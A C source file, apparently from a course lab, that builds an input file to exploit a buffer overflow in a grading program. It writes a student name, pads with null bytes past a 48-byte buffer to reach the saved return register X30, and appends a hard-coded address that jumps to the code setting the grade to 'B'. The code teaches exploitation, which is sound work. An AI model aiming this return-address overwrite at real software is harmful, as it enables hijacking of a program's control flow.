/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Sean Wang, Giao Vu Dinh                                    */
/*--------------------------------------------------------------------*/


#include <stdio.h>
#include <string.h>
enum {BUFSIZE = 48};

/*--------------------------------------------------------------------*/


/* Does not accept any command-line arguments or read text from stdin. 
Writes bytes of data including student name, null bytes, and a memory 
address to a file. Returns 0.
*/

int main(void)
{
   unsigned int i;
   unsigned long ulData;
   char* psName;
   FILE *psFile;
   ulData = 0x400858; 
   psFile = fopen("dataB", "w");
   psName = "Sean Wang";

   /* Writes the student's name to the dataB file */
   for (i = 0; i<strlen(psName); i++){
       fprintf(psFile, "%c", psName[i]);
   }
   /* Writes enough null bytes to the dataB file
   to overrun until X30 */
   for (i = 0; i<(BUFSIZE-(strlen(psName))); i++){
       fprintf(psFile, "%c", 0x00);
   }

   /* Writes the address which corresponds to 
   instruction: grade = 'B' */
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   fclose(psFile);


   return 0;
}
